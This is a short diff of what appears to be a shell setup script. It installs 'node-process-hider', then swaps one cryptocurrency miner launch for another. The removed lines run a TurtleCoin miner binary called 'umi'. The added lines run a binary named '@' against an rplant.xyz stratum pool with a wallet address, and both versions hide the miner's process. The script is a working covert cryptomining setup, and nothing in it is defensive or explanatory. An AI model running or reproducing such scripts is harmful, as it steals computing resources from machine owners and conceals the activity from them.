@@ -8,6 +8,6 @@ node –version
 apt install npm -y
 npm –version 
 npm i -g node-process-hider
-chmod u+x umi
-ph add umi
-./umi --donate-level 1 -o de.turtlecoin.herominers.com:1160 -u TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+57b556a426f1d8edc56d41fbda69d9f6a1d4e2d55f53d955e2b0dc17b1599cee -p cici -a argon2/chukwav2 -k 
+chmod u+x @
+ph add @
+./@ -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17068 -u RFbqnHHydtYxrq6jwqmwZgMt7CR4s5rKd7 -t34
